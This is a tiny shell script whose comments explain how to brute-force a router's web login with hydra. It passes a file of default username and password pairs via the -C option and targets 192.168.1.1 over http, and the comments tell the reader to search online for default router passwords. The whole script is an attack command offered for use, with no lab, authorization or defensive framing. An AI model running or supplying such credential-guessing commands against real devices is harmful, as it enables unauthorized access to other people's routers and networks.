#!/bin/sh

# using hydra to bruteforce router username password

# google for default router passwords


# pass the router password file onto hydra with the -C option
# then pass the serice you are trying to crack eg http or telnet
hydra -C routerpass.txt 192.168.1.1 http 


